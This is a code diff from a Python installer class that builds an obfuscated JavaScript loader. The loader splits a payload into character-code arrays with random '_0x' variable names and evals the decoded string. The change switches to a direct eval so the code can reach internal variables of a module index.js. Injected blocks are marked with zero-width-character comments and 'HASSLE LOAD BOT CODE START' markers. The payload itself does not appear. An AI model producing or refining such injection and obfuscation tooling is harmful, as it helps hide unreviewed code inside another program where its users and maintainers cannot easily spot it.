@@ -505,15 +505,15 @@ class InstallerAPI:
         n = len(codes)
         p1, p2, p3 = codes[:n//3], codes[n//3:(n*2)//3], codes[(n*2)//3:]
         def rnd(): return '_0x'+''.join(random.choices(string.ascii_letters+string.digits, k=6))
-        v1,v2,v3,v4,v5,v6 = rnd(),rnd(),rnd(),rnd(),rnd(),rnd()
+        v1,v2,v3,v4,v6 = rnd(),rnd(),rnd(),rnd(),rnd()
+        # Direct eval — видит переменные модуля index.js (Oe, Ao, sr, Mu и т.д.)
         return (f"(function(){{const {v1}=[{','.join(map(str,p1))}];"
                 f"const {v2}=[{','.join(map(str,p2))}];"
                 f"const {v3}=[{','.join(map(str,p3))}];"
                 f"const {v4}=[...{v1},...{v2},...{v3}];"
-                f"const {v5}=Function('return this')();"
-                f"return {v5}[String.fromCharCode(101,118,97,108)]("
+                f"return eval("
                 f"{v4}.map(function({v6}){{return String.fromCharCode({v6})}}).join(''))}})();")
-
+                
     _MARK_S = "//\u200b\u200c\u200b"
     _MARK_E = "//\u200c\u200b\u200c"
     _LEGACY_S = "// === HASSLE LOAD BOT CODE START ==="
